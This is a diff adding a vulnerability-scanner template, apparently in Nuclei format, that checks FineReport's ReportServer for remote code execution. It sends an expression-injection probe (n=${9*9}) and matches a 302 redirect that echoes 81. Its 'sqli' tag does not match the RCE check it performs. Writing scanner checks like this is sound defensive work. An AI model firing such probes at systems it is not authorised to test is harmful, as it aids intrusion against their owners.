@@ -1,0 +1,28 @@
+id: finereport-ReportServer-rce
+
+info:
+  name: finereport-ReportServer-rce
+  author: finereport
+  severity: critical
+  description: finereport-ReportServer-rce
+  tags: sqli
+
+http:
+  - raw:
+      - |
+        GET /decision/view/ReportServer?test=&n=${9*9} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+    matchers-condition: and
+
+    matchers:
+      - type: dsl 
+        dsl:
+          - contains(header,"decision/view/report?test&n=81") && status_code == 302
+
+
+          
